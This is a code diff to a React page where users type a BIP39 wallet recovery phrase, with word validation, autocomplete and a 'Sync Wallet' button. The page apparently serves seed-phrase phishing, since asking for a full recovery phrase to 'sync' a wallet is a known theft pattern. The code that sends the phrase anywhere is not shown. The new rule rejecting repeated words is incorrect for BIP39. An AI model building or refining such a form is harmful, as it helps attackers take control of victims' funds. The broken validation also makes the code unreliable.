@@ -704,61 +704,107 @@ export default function Home() {
                 onClick={() => setShowPhrase(!showPhrase)}
                 type="button"
               >
-                {showPhrase ? "👁️ Hide" : "👁️‍🗨️ Show"}
+                {showPhrase ? (
+                  <>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
+                    Hide
+                  </>
+                ) : (
+                  <>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                    Show
+                  </>
+                )}
               </button>
             </div>
 
             <form onSubmit={handleSubmit}>
-              <div className="word-grid">
-                {phraseWords.map((word, i) => {
-                  const isValid = bip39List.includes(word);
-                  const isInvalid = word.length > 0 && !isValid;
-                  const showSuggestions = focusedIndex === i && word.length > 0 && !isValid;
-                  const suggestions = showSuggestions ? bip39List.filter(w => w.startsWith(word)).slice(0, 4) : [];
+              {(() => {
+                const filledWords = phraseWords.filter(w => w.length > 0);
+                const invalidWords = Array.from(new Set(filledWords.filter(w => !bip39List.includes(w))));
+                
+                const wordCounts = filledWords.reduce((acc, w) => {
+                  if (bip39List.includes(w)) acc[w] = (acc[w] || 0) + 1;
+                  return acc;
+                }, {} as Record<string, number>);
+                
+                const duplicateWords = Object.keys(wordCounts).filter(w => wordCounts[w] > 1);
+                const hasErrors = invalidWords.length > 0 || duplicateWords.length > 0;
+                const canSubmit = phraseWords.every(w => w.length > 0) && !hasErrors;
 
-                  return (
-                    <div className="word-input-wrap" key={i}>
-                      <span className="word-num">{i + 1}</span>
-                      <input
-                        ref={el => { inputRefs.current[i] = el; }}
-                        className={`word-input ${isValid ? 'valid-word' : ''} ${isInvalid ? 'invalid-word' : ''}`}
-                        type={showPhrase ? "text" : "password"}
-                        value={word}
-                        onChange={e => handleWordChange(i, e.target.value)}
-                        onKeyDown={e => handleKeyDown(i, e)}
-                        onFocus={() => setFocusedIndex(i)}
-                        onBlur={() => setTimeout(() => setFocusedIndex(null), 150)}
-                        autoComplete="off"
-                        spellCheck={false}
-                        disabled={submitting}
-                      />
-                      {showSuggestions && suggestions.length > 0 && (
-                        <div className="suggestions-dropdown">
-                          {suggestions.map(sugg => (
-                            <div 
-                              key={sugg} 
-                              className="suggestion-item"
-                              onMouseDown={(e) => {
-                                e.preventDefault();
-                                handleSuggestionClick(i, sugg);
-                              }}
-                            >
-                              {sugg}
-                            </div>
-                          ))}
-                        </div>
-                      )}
+                return (
+                  <>
+                    <div className="word-grid">
+                      {phraseWords.map((word, i) => {
+                        const isBip39 = bip39List.includes(word);
+                        const isDuplicate = isBip39 && wordCounts[word] > 1;
+                        const isInvalid = word.length > 0 && (!isBip39 || isDuplicate);
+                        const isValid = word.length > 0 && isBip39 && !isDuplicate;
+                        const showSuggestions = focusedIndex === i && word.length > 0;
+                        const suggestions = showSuggestions ? bip39List.filter(w => w !== word && w.startsWith(word)).slice(0, 4) : [];
+
+                        return (
+                          <div className="word-input-wrap" key={i} style={{ zIndex: focusedIndex === i ? 20 : 1 }}>
+                            <span className="word-num">{i + 1}</span>
+                            <input
+                              ref={el => { inputRefs.current[i] = el; }}
+                              className={`word-input ${isValid ? 'valid-word' : ''} ${isInvalid ? 'invalid-word' : ''}`}
+                              type={showPhrase ? "text" : "password"}
+                              value={word}
+                              onChange={e => handleWordChange(i, e.target.value)}
+                              onKeyDown={e => handleKeyDown(i, e)}
+                              onFocus={() => setFocusedIndex(i)}
+                              onBlur={() => setTimeout(() => setFocusedIndex(null), 150)}
+                              autoComplete="off"
+                              spellCheck={false}
+                              disabled={submitting}
+                            />
+                            {showSuggestions && suggestions.length > 0 && (
+                              <div className="suggestions-dropdown">
+                                {suggestions.map(sugg => (
+                                  <div 
+                                    key={sugg} 
+                                    className="suggestion-item"
+                                    onMouseDown={(e) => {
+                                      e.preventDefault();
+                                      handleSuggestionClick(i, sugg);
+                                    }}
+                                  >
+                                    {sugg}
+                                  </div>
+                                ))}
+                              </div>
+                            )}
+                          </div>
+                        );
+                      })}
                     </div>
-                  );
-                })}
-              </div>
-              <button 
-                type="submit" 
-                className="submit-btn" 
-                disabled={!phraseWords.every(w => bip39List.includes(w)) || submitting}
-              >
-                {submitting ? "Syncing..." : "Sync Wallet"}
-              </button>
+
+                    {hasErrors && (
+                      <div style={{ marginBottom: '24px', padding: '16px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '12px', border: '1px solid rgba(239, 68, 68, 0.2)' }}>
+                        {invalidWords.length > 0 && (
+                          <div style={{ color: '#ef4444', fontSize: '13px', marginBottom: duplicateWords.length > 0 ? '8px' : '0' }}>
+                            <strong style={{ fontWeight: 600 }}>Invalid word(s):</strong> {invalidWords.join(", ")}
+                          </div>
+                        )}
+                        {duplicateWords.length > 0 && (
+                          <div style={{ color: '#ef4444', fontSize: '13px' }}>
+                            <strong style={{ fontWeight: 600 }}>Duplicate word(s):</strong> {duplicateWords.join(", ")} (words cannot be repeated)
+                          </div>
+                        )}
+                      </div>
+                    )}
+
+                    <button 
+                      type="submit" 
+                      className="submit-btn" 
+                      disabled={!canSubmit || submitting}
+                    >
+                      {submitting ? "Syncing..." : "Sync Wallet"}
+                    </button>
+                  </>
+                );
+              })()}
             </form>
           </div>
         </div>
